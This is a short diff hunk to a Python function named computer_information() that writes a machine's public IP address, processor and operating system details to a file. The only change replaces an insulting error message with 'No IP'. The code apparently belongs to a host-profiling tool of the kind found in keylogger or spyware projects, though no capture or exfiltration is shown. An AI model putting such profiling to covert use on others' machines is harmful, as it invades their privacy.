@@ -105,7 +105,7 @@ def computer_information():
             public_ip = get("https://api.ipify.org").text
             f.write("Public IP Address: " + public_ip + '\n')
         except Exception:
-            f.write("No ip loser monkey")
+            f.write("No IP")
 
         f.write("Processor: " + (platform.processor()) + '\n')
         f.write("System: " + platform.system() + " " + platform.version() + '\n')
